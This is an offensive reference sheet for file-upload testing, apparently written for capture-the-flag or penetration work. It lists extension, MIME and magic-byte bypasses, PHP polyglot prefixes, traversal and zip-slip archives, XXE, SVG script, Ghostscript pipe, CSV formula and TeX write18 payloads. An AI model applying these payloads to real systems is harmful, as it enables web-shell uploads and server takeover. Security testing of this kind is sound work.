# Cheatsheet — the two-column field reference

## Layer → first payload

| Rejection names | Try first |
|---|---|
| extension | `.phtml`, `.pht`, `.phar`, `.PhP`, `.php.jpg`, `.php.` , `.php `, `.php%00.jpg` |
| MIME/Content-Type | `Content-Type: image/jpeg` on a `.php` |
| magic bytes | `GIF89a;\n<?php` as `.gif`/`.php` |
| structural image | real PNG + appended `<?php`, or iTXt chunk |
| full re-encode | pixel/IDAT (`image-attacks.md`) or pivot to include/consumer |
| AV/content grep | `<?=`, func-var call, obfuscation |
| path allowed | `../`/`..\\`/absolute/`....//` |
| zip extract | `archive_gen.py zipslip` |
| tar extract | `archive_gen.py tarslip` + symlink |
| phar path | `archive_gen.py phar --marker` |
| docx/xlsx import | XXE in `document.xml`/`sharedStrings.xml` |
| svg accepted | `<svg onload>` / `<script>` / `<image href=>` |
| pdf rendered | `%pipe%` gs payload / `%PDF`+`<?php` polyglot |
| csv import | `=cmd`, `=HYPERLINK` formula injection |
| media probe | `.m3u8` `URI=`/`concat:` HLS |
| markdown render | HTML/JS pass-through, `javascript:` links |
| tex compiled | `\input`, `\write18` |

## Stack → extension family

| Stack | Executable exts | Also try |
|---|---|---|
| Apache+PHP | `.php .php3-7 .phtml .pht .phar .pgif` | `.htaccess`, `.user.ini`, `.php.xyz` |
| Nginx+php-fpm | `.php` | `.user.ini`, `x.jpg/x.php` |
| IIS | `.asp .aspx .cer .cdx .ashx .soap` | `;` trick, `::$DATA`, `web.config` |
| Tomcat/Java | `.jsp .jspx .jsw .jsv .jspf` | `.war` autodeploy |
| Node | none by ext | content/parser/path only |
| Python | none by ext | template include, import, `.pth` |
| CGI-bin | `.pl .cgi .py .rb .sh` | ExecCGI handler |

## Filename → what it tests

| Name | Tests |
|---|---|
| `x.php` | baseline exec |
| `x.phtml`/`.pht`/`.phar` | blacklist gap |
| `x.php.jpg` / `x.jpg.php` | which ext the check reads |
| `x.PhP` / `.PHP5` | case sensitivity |
| `x.php.` / `x.php ` / `x.php%20` | trailing-junk strip |
| `x.php%00.jpg` | NUL truncate (legacy) |
| `x.php;.jpg` / `x.aspx;1.jpg` | IIS semicolon |
| `x.php::$DATA` | NTFS ADS |
| `../../x.php` | traversal |
| `..\\..\\x.php` | Windows separators |
| `x.php\x00.jpg` | raw NUL |
| `filename*='UTF-8''x%2Ephp'` | RFC 5987 field |
| `x.php";` `x.php"` | quoted-string escapes |
| `.htaccess` / `.user.ini` | config upload (dotfile ext-miss) |

## Content-type/MIME → spoof values

`image/jpeg`, `image/png`, `image/gif`, `text/plain`,
`application/pdf`, `application/octet-stream`, empty, absent, duplicated,
`Image/JPEG` (case), `image/jpeg;charset=utf-8`.

## Magic-byte prefix → claimed type

| Bytes | Claims |
|---|---|
| `GIF89a` / `GIF87a` | gif — PHP-execution-tolerant |
| `\x89PNG\r\n\x1a\n` | png — needs real structure for strict parsers |
| `\xFF\xD8\xFF` | jpeg — COM segment embeds payload |
| `%PDF-1.x` | pdf — tolerant of tail junk |
| `PK\x03\x04` | zip — tail-anchored, real zip required |
| `BM` + header | bmp |
| `RIFF....WEBP` | webp |
| `ftyp` at +4 | mp4/mov |

## Serve verdict → next move

| `upload_probe verify` | Means | Next |
|---|---|---|
| `served-raw` | verbatim storage | include/phar/template, source-read flag |
| `executed-or-transformed` | ran or processed | inspect bytes — which happened? |
| `blocked` | rule denied | ext/path variants, config trick |
| `gone` | not there | `retrieval.md` — find the path |

## The essential tools

| Task | Tool |
|---|---|
| canary set | `tools/web/upload_probe.py gen --dir up/` |
| fetch grade | `tools/web/upload_probe.py verify --url X --expect-source '<?php'` |
| zip/tar/phar | `tools/web/archive_gen.py {zipslip,tarslip,phar}` |
| probe+evidence | `tools/web/http_probe.py --write-ack` |
| PDF read-back | `tools/web/pdf_text.py <f> --find-flag` |
| OOB callback | `tools/web/oob_listener.py serve|hits|canary` |
| race window | `tools/web/race_probe.py --url A --url-b B --write-ack` |
| path discovery | `ffuf`/`feroxbuster` on `/uploads/FUZZ` |
| metadata work | `exiftool` |
| carve/polyglot audit | `binwalk` |

## The falsifiers — when to stop

- no file retrievable AND no consumer → closed
- ext airtight + mapping airtight + no config path → pivot to consumer/traversal
- re-encode strips everything + no include/consumer → pivot
- 403-locked docroot + no include → dead
